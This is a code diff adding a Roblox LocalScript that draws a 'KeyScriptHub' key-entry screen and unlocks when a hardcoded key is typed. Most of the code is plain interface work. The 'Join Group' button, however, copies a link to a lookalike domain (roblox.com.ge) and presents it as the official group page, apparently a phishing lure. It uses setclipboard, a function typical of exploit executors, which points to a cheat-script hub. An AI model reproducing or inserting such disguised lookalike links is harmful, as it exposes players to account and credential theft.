@@ -1,0 +1,212 @@
+-- LocalScript in StarterPlayerScripts
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+local GROUP_ID = 412184674919
+local VALID_KEY = "KSH-FREE-2026"
+
+-- Blur
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = game:GetService("Lighting")
+TweenService:Create(blur, TweenInfo.new(0.5), {Size = 12}):Play()
+
+local sg = Instance.new("ScreenGui")
+sg.Name = "KeySystem"
+sg.ResetOnSpawn = false
+sg.IgnoreGuiInset = true
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+sg.Parent = player.PlayerGui
+
+-- Dark overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.fromScale(1, 1)
+overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+overlay.BackgroundTransparency = 0.85
+overlay.BorderSizePixel = 0
+overlay.Parent = sg
+
+-- Card
+local card = Instance.new("Frame")
+card.Size = UDim2.new(0, 360, 0, 295)
+card.Position = UDim2.new(0.5, -180, 0.6, -147)
+card.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
+card.BorderSizePixel = 0
+card.Parent = sg
+Instance.new("UICorner", card).CornerRadius = UDim.new(0, 20)
+
+-- Glow border via UIStroke
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(110, 60, 220)
+stroke.Transparency = 0.5
+stroke.Thickness = 1.5
+stroke.Parent = card
+
+-- Animate card entrance
+card.Position = UDim2.new(0.5, -180, 0.7, -147)
+card.BackgroundTransparency = 1
+TweenService:Create(card, TweenInfo.new(0.45, Enum.EasingStyle.Back), {
+    Position = UDim2.new(0.5, -180, 0.5, -147),
+    BackgroundTransparency = 0.5
+}):Play()
+
+local layout = Instance.new("UIListLayout")
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Padding = UDim.new(0, 11)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.Parent = card
+
+local pad = Instance.new("UIPadding")
+pad.PaddingTop = UDim.new(0, 22)
+pad.PaddingLeft = UDim.new(0, 20)
+pad.PaddingRight = UDim.new(0, 20)
+pad.Parent = card
+
+-- Title row
+local titleFrame = Instance.new("Frame")
+titleFrame.Size = UDim2.new(1, 0, 0, 46)
+titleFrame.BackgroundTransparency = 1
+titleFrame.LayoutOrder = 1
+titleFrame.Parent = card
+
+local iconBg = Instance.new("Frame")
+iconBg.Size = UDim2.new(0, 40, 0, 40)
+iconBg.Position = UDim2.new(0, 0, 0.5, -20)
+iconBg.BackgroundColor3 = Color3.fromRGB(100, 40, 200)
+iconBg.BorderSizePixel = 0
+iconBg.Parent = titleFrame
+Instance.new("UICorner", iconBg).CornerRadius = UDim.new(0, 10)
+
+local iconLbl = Instance.new("TextLabel")
+iconLbl.Size = UDim2.fromScale(1, 1)
+iconLbl.BackgroundTransparency = 1
+iconLbl.Text = "🔑"
+iconLbl.TextSize = 20
+iconLbl.Font = Enum.Font.GothamBold
+iconLbl.Parent = iconBg
+
+local titleLbl = Instance.new("TextLabel")
+titleLbl.Size = UDim2.new(1, -54, 1, 0)
+titleLbl.Position = UDim2.new(0, 54, 0, 0)
+titleLbl.BackgroundTransparency = 1
+titleLbl.Text = "KeyScriptHub"
+titleLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLbl.TextSize = 26
+titleLbl.Font = Enum.Font.GothamBold
+titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+titleLbl.Parent = titleFrame
+
+-- Divider
+local div = Instance.new("Frame")
+div.Size = UDim2.new(1, 0, 0, 1)
+div.BackgroundColor3 = Color3.fromRGB(110, 60, 220)
+div.BackgroundTransparency = 0.5
+div.BorderSizePixel = 0
+div.LayoutOrder = 2
+div.Parent = card
+
+local function makeBtn(text, bg, order)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, 0, 0, 48)
+    b.BackgroundColor3 = bg
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.TextSize = 16
+    b.Font = Enum.Font.GothamBold
+    b.BorderSizePixel = 0
+    b.LayoutOrder = order
+    b.Parent = card
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 12)
+
+    b.MouseEnter:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = bg:Lerp(Color3.new(1,1,1), 0.1)}):Play()
+    end)
+    b.MouseLeave:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = bg}):Play()
+    end)
+    b.MouseButton1Down:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.08), {Size = UDim2.new(0.97, 0, 0, 46)}):Play()
+    end)
+    b.MouseButton1Up:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.12, Enum.EasingStyle.Back), {Size = UDim2.new(1, 0, 0, 48)}):Play()
+    end)
+    return b
+end
+
+local joinBtn = makeBtn("🌐  Join Group to Get Key", Color3.fromRGB(30, 90, 220), 3)
+
+local copyHint = Instance.new("TextLabel")
+copyHint.Size = UDim2.new(1, 0, 0, 16)
+copyHint.BackgroundTransparency = 1
+copyHint.Text = "(click to copy)"
+copyHint.TextColor3 = Color3.fromRGB(150, 150, 180)
+copyHint.TextSize = 11
+copyHint.Font = Enum.Font.Gotham
+copyHint.LayoutOrder = 4
+copyHint.Parent = card
+
+local keyBox = Instance.new("TextBox")
+keyBox.Size = UDim2.new(1, 0, 0, 48)
+keyBox.BackgroundColor3 = Color3.fromRGB(22, 22, 35)
+keyBox.PlaceholderText = "Paste your key here..."
+keyBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 130)
+keyBox.Text = ""
+keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyBox.TextSize = 15
+keyBox.Font = Enum.Font.Gotham
+keyBox.BorderSizePixel = 0
+keyBox.LayoutOrder = 5
+keyBox.Parent = card
+Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 12)
+local ks = Instance.new("UIStroke")
+ks.Color = Color3.fromRGB(80, 80, 120)
+ks.Thickness = 1
+ks.Parent = keyBox
+keyBox.Focused:Connect(function()
+    TweenService:Create(ks, TweenInfo.new(0.2), {Color = Color3.fromRGB(130, 70, 240), Thickness = 1.5}):Play()
+end)
+keyBox.FocusLost:Connect(function()
+    TweenService:Create(ks, TweenInfo.new(0.2), {Color = Color3.fromRGB(80, 80, 120), Thickness = 1}):Play()
+end)
+
+local submitBtn = makeBtn("✅  Submit Key", Color3.fromRGB(15, 160, 100), 6)
+
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, 0, 0, 22)
+status.BackgroundTransparency = 1
+status.Text = ""
+status.TextColor3 = Color3.fromRGB(255, 90, 90)
+status.TextSize = 13
+status.Font = Enum.Font.Gotham
+status.LayoutOrder = 7
+status.Parent = card
+
+joinBtn.MouseButton1Click:Connect(function()
+    setclipboard("https://roblox.com.ge/communities/7529853142/")
+    status.TextColor3 = Color3.fromRGB(100, 180, 255)
+    status.Text = "✅ Link copied to clipboard!"
+end)
+
+submitBtn.MouseButton1Click:Connect(function()
+    local entered = keyBox.Text
+
+    if entered == VALID_KEY then
+        status.TextColor3 = Color3.fromRGB(60, 220, 130)
+        status.Text = "✅ Access granted! Welcome!"
+        task.wait(1.5)
+        TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()
+        TweenService:Create(card, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+            Position = UDim2.new(0.5, -180, 0.7, -147),
+            BackgroundTransparency = 1
+        }):Play()
+        task.wait(0.45)
+        blur:Destroy()
+        sg:Destroy()
+        -- 🔓 Your game unlock logic here
+    else
+        status.TextColor3 = Color3.fromRGB(255, 80, 80)
+        status.Text = "❌ Incorrect key!"
+    end
+end)
